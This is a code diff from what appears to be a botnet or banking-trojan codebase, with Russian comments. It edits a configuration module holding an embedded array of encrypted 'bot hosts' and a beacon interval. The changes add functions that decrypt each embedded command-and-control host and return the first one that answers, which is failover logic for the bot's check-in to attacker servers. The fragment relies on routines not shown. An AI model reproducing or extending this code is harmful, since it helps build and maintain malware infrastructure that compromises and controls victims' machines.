@@ -40,14 +40,10 @@ namespace CONFIGDEBUGSTRINGS
 	//
 	//  host1.com\0host2.com\0host3.com\0\0
 	//****************************************************************************
-	char BOT_HOSTS_ARRAY[MAX_HOSTS_BUF_SIZE] = "ALL_HOSTS_BUFFER\0";
+	char BOT_HOSTS_ARRAY[MAX_HOSTS_BUF_SIZE] = "ALL_HOSTS_BUFFER\0\0";
 
 	#define HASH_EMPTY_HOSTS_BUF  0xE98F4C1C /* ALL_HOSTS_BUFFER */
 
-
-	//char MainHost_1[MAX_HOST_SIZE + 1] = "FULL_URL_1\0";
-	//char MainHost_2[MAX_HOST_SIZE + 1] = "FULL_URL_2\0";
-	//char MainHost_3[MAX_HOST_SIZE + 1] = "FULL_URL_3\0";
 
 	//----------------------------------------------------------------------------
 	// Интервал отстука (в минутах). Строковое значение
@@ -284,12 +280,36 @@ PCHAR GetActiveHost()
 			CFGDBG("Cofig", "Полусили хост из файла");
 			return Result;
 		}
-
-
 		return GetActiveHostFromBuf(BOT_HOSTS_ARRAY, HASH_EMPTY_HOSTS_BUF);
 	#endif
 }
 //-----------------------------------------------------------------------------
+
+string GetActiveHost2()
+{
+	// Функция возвращает активный (доступный) хост
+	#ifdef DEBUGCONFIG
+		return DebugHost;
+
+	#else
+		string Result;
+
+		CFGDBG("Cofig", "Получаем активный хост");
+
+		// Первым этапом пытаемся получить хост из файла
+//		PCHAR Tmp = NULL;
+//		if (Hosts::GetActiveHostFormFile(NULL, Tmp))
+//		{
+//			CFGDBG("Cofig", "Полусили хост из файла");
+//			Result = Tmp;
+//			STR::Free(Tmp);
+//			return Result;
+//		}
+		return GetActiveHostFromBuf2(BOT_HOSTS_ARRAY, HASH_EMPTY_HOSTS_BUF, true);
+	#endif
+}
+//-----------------------------------------------------------------------------
+
 
 PCHAR GetActiveHostFromBuf(PCHAR Hosts, DWORD EmptyArrayHash)
 {
@@ -323,6 +343,42 @@ PCHAR GetActiveHostFromBuf(PCHAR Hosts, DWORD EmptyArrayHash)
 
 	return NULL;
 }
+
+
+string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encrypted)
+{
+	//  Функция возвращает хост из буфера
+	string Result;
+	if (AnsiStr::IsEmpty(Hosts))
+    	return Result;
+
+	if (EmptyArrayHash != 0 && AnsiStr::Hash(Hosts) == EmptyArrayHash)
+	{
+		// Хосты не вшиты
+		return Result;
+	}
+
+	PCHAR Host = (PCHAR)Hosts;
+
+	while (*Host != 0)
+	{
+		// декриптуем хост и проверяем его
+        string Tmp = Host;
+		// Расшифровываем данные
+		if (Encrypted)
+			Decrypt(Host, Tmp.t_str());
+
+		if (Hosts::CheckHost(Tmp.t_str()))
+			return Tmp;
+
+		// переходим на другой элемент
+		Host = STR::End(Host);
+		Host++;
+	}
+
+	return Result;
+}
+
 //-----------------------------------------------------------------------------
 
 PCHAR GetBotScriptURL(DWORD Script, PCHAR Path)
